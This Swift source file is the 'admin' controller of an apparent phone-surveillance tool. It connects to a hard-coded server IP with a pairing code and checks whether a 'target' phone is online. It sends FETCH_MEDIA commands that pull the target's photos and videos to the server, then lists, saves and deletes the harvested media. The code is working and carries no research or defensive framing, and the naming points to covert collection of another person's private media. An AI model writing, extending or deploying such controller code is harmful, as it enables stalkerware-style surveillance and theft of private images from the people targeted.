import Foundation
import UIKit
import Photos

struct VaultMediaItem: Identifiable, Codable {
    let id: String
    let pairingCode: String
    let filename: String
    let originalName: String?
    let mimeType: String
    let size: Int
    let type: String
    let url: String
    let createdAt: String
}

class AdminEngine: ObservableObject {
    static let shared = AdminEngine()

    @Published var serverURL: String = "http://213.199.53.54:7000"
    @Published var pairingCode: String = "VAULT-7860"
    @Published var isTargetOnline: Bool = false
    @Published var targetPhotosCount: Int = 0
    @Published var targetVideosCount: Int = 0
    @Published var vaultItems: [VaultMediaItem] = []
    @Published var isSyncing: Bool = false
    @Published var syncProgress: Double = 0.0
    @Published var statusMessage: String = "Disconnected"

    private let session = URLSession.shared
    private var pollTimer: Timer?

    init() {
        let defaults = UserDefaults.standard
        if let savedCode = defaults.string(forKey: "admin_pairing_code"), !savedCode.isEmpty {
            pairingCode = savedCode
        }
    }

    func connect(code: String) {
        pairingCode = code.trimmingCharacters(in: .whitespacesAndNewlines).uppercased()
        UserDefaults.standard.set(pairingCode, forKey: "admin_pairing_code")

        startMonitoring()
        fetchVaultMedia()
    }

    func startMonitoring() {
        pollTimer?.invalidate()
        checkTargetStatus()
        pollTimer = Timer.scheduledTimer(withTimeInterval: 3.0, repeats: true) { [weak self] _ in
            self?.checkTargetStatus()
        }
    }

    func checkTargetStatus() {
        guard let url = URL(string: "\(serverURL)/api/pair/check") else { return }
        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        let body = ["code": pairingCode]
        req.httpBody = try? JSONSerialization.data(withJSONObject: body)

        session.dataTask(with: req) { [weak self] data, _, error in
            guard let self = self, let data = data, error == nil else { return }
            if let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any] {
                DispatchQueue.main.async {
                    self.isTargetOnline = json["isTargetOnline"] as? Bool ?? false
                    self.statusMessage = self.isTargetOnline ? "Phone A Online" : "Phone A Offline"
                }
            }
        }.resume()
    }

    func sendSyncCommand(type: String, count: Int) {
        guard let url = URL(string: "\(serverURL)/api/commands") else { return }
        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")

        let command: [String: Any] = [
            "action": "FETCH_MEDIA",
            "type": type,
            "count": count
        ]
        let body: [String: Any] = [
            "code": pairingCode,
            "command": command
        ]
        req.httpBody = try? JSONSerialization.data(withJSONObject: body)

        DispatchQueue.main.async {
            self.isSyncing = true
            self.syncProgress = 0.1
        }

        session.dataTask(with: req) { [weak self] _, _, _ in
            // Refresh media after 5 seconds
            DispatchQueue.main.asyncAfter(deadline: .now() + 5.0) {
                self?.fetchVaultMedia()
                self?.isSyncing = false
            }
        }.resume()
    }

    func fetchVaultMedia() {
        guard let url = URL(string: "\(serverURL)/api/media?code=\(pairingCode)") else { return }
        session.dataTask(with: url) { [weak self] data, _, error in
            guard let self = self, let data = data, error == nil else { return }
            do {
                let res = try JSONDecoder().decode(MediaListResponse.self, from: data)
                DispatchQueue.main.async {
                    self.vaultItems = res.items
                }
            } catch {
                print("Decode error: \(error)")
            }
        }.resume()
    }

    func saveToCameraRoll(item: VaultMediaItem) {
        guard let fullURL = URL(string: "\(serverURL)\(item.url)") else { return }
        session.dataTask(with: fullURL) { data, _, _ in
            guard let data = data else { return }
            if item.type == "video" {
                let tempURL = FileManager.default.temporaryDirectory.appendingPathComponent(item.filename)
                try? data.write(to: tempURL)
                PHPhotoLibrary.shared().performChanges({
                    PHAssetChangeRequest.creationRequestForAssetFromVideo(atFileURL: tempURL)
                })
            } else {
                if let image = UIImage(data: data) {
                    UIImageWriteToSavedPhotosAlbum(image, nil, nil, nil)
                }
            }
        }.resume()
    }

    func deleteMedia(filename: String) {
        guard let url = URL(string: "\(serverURL)/api/media/\(filename)?code=\(pairingCode)") else { return }
        var req = URLRequest(url: url)
        req.httpMethod = "DELETE"
        session.dataTask(with: req) { [weak self] _, _, _ in
            DispatchQueue.main.async {
                self?.vaultItems.removeAll { $0.filename == filename }
            }
        }.resume()
    }
}

struct MediaListResponse: Codable {
    let count: Int
    let items: [VaultMediaItem]
}
